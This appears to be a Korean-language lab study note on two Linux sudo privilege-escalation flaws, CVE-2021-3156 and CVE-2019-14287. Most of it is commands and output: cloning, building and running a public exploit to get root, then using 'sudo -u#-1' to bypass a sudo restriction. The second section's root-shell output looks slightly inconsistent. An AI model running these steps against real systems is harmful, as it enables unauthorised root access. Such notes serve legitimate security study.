## CVE-2021-3156 (Priv. escalation)

Sudo 취약점에 영향을 받는 sudo의 version은 아래와 같다.
- **1.8.31 - Ubuntu 20.04**
- **1.8.27 - Debian 10**
- **1.9.2 - Fedora 33**
- **and others**

**Sudo Version 조회**
```powershell
cry0l1t3@nix02:~$ sudo -V | head -n1

Sudo version 1.8.31
```

**PoC 다운 및 빌드**
```powershell
cry0l1t3@nix02:~$ git clone <https://github.com/blasty/CVE-2021-3156.git>
cry0l1t3@nix02:~$ cd CVE-2021-3156
cry0l1t3@nix02:~$ make

rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
```

**PoC 기능 확인**
```powershell
cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich <target>

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

  manual mode:
    ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>
```

**OS 버전 확인**
```powershell
cry0l1t3@nix02:~$ cat /etc/lsb-release

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"
```

**권한 상승 공격**
```powershell
cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich 1

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
** pray for your rootshell.. **

# id

uid=0(root) gid=0(root) groups=0(root)
```

## CVE-2019-14287 (Sudo Policy Bypass)

**1.8.28 버전 아래**에서 권한 상승이 가능한 취약점이 존재한다.

**Sudo 권한 확인**
```powershell
cry0l1t3@nix02:~$ sudo -l
[sudo] password for cry0l1t3: **********

User cry0l1t3 may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id
```

```powershell
cry0l1t3@nix02:~$ cat /etc/passwd | grep cry0l1t3

cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash
```

현재 사용자인 cry0l1t3은 1005의 ID를 갖는다. sudo 에 음수인 ID(-1)을 입력하면 루트만 가지고 있는 ID인 0을 처리하게 된다. 따라서 바로 루트 쉘이 생성된다.
```powershell
cry0l1t3@nix02:~$ sudo -u#-1 id

root@nix02:/home/cry0l1t3# id

uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)
```